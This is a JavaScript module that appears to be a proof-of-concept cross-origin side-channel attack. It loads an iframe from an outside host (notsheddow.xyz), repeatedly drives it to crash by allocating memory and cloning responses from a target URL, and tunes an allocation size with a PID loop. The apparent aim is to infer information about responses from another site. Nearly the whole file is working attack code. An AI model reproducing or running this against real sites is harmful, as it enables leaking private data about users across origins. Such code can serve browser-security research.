const IFRAME_URL = "https://notsheddow.xyz/resp_clone/iframe.html"

const KB = 1024;
const MB = 1024*1024;
const GB = 1024*1024*1024;

async function wait(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function wait_until_frame_has_crashed() {
    while (window.frames[0].frames.length > 0) {
        await wait(1);
    }
}

async function wait_until_frame_has_loaded() {
    while (window.frames[0].frames.length === 0) {
        await wait(1);
    }
}

async function ensure_iframe() {
    if (window.frames.length === 0) {
        let f = document.createElement('iframe');
        f.src = IFRAME_URL;
        let has_loaded = new Promise(resolve => { f.onload = resolve });
        document.body.appendChild(f);
        await has_loaded;
    }
}

async function reload_iframe() {
    window.frames[0].location = "about:blank";
    await wait(20);
    window.frames[0].location = IFRAME_URL
    await wait_until_frame_has_loaded();
}

async function get_max_alloc_size() {
    let size = 0;
    function msg_handler(event) {
        size = event.data;
    }

    window.addEventListener("message", msg_handler);
    window.frames[0].postMessage({action: "alloc_until_crash"}, "*");
    await wait_until_frame_has_crashed();
    window.removeEventListener("message", msg_handler);

    await reload_iframe();
    return size;
}

async function get_count(url, alloc_size) {
    let count = 0;
    function msg_handler(event) {
        count = event.data;
    }

    window.addEventListener("message", msg_handler);
    window.frames[0].postMessage({action: "clone_until_crash", url, alloc_size}, "*");
    await wait_until_frame_has_crashed();
    window.removeEventListener("message", msg_handler);

    await reload_iframe();
    return count;
}

async function get_samples(url, alloc_size, n = 5) {
    let samples = [];
    for (let i = 0; i < n; i++) {
        samples.push(await get_count(url, alloc_size));
    }
    return samples;
}

async function tune_for_url(url, initial_size, target = 75) {
    let Kp = -128*KB;
    let Ki = -8*KB;
    let Kd = -32*KB;
    let precision = 15;
    let size = initial_size;
    let measurement = await measure(url, size);
    let previous_error = 0;
    let integral = 0;
    while (measurement < target - precision || measurement > target + precision) {
        console.log(measurement);
        let error = target - measurement;
        integral += error;
        let derivative = error - previous_error;
        previous_error = error;

        let correction = error*Kp + integral*Ki + derivative*Kd;
        
        size += correction;
        pretty_print_size(size);
        measurement = await measure(url, size);
    }
    console.log(measurement);

    return {size, count: measurement};
}

function pretty_print_size(size) {
    let gb = Math.floor(size / GB);
    let mb = Math.floor((size % GB) / MB);
    let kb = Math.floor((size % MB) / KB);
    console.log(`size: ${gb} GB + ${mb} MB + ${kb} KB`);
}

async function measure(url, alloc_size) {
    await ensure_iframe();
    let t0 = window.performance.now();
    let samples = await get_samples(url, alloc_size, 3);
    console.log(`elapsed: ${window.performance.now() - t0}`);
    samples.sort((a, b) => a-b);
    return samples[1];
}

async function calibrate(url, initial_size = undefined) {
    await ensure_iframe();
    let t0 = window.performance.now();
    if (!initial_size) {
        initial_size = 4*GB;
    }
    console.log("Tuning...");
    let res = await tune_for_url(url, initial_size);
    console.log(`elapsed for tuning: ${window.performance.now() - t0}`);
    return res;
}

export {calibrate, measure};
